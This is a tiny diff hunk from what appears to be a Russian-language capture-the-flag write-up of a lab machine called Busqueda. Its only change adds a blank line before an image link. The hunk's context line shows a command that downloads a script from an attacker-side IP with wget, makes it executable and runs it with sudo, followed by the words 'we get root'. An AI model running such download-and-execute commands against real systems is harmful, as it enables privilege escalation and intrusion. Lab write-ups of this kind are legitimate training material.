@@ -97,4 +97,5 @@ wget http://10.10.14.12:6666/full-checkup.sh && chmod +x full-checkup.sh && sudo
 ```
 
 Получаем root.
+
 ![](../assets/Busqueda/12.png)
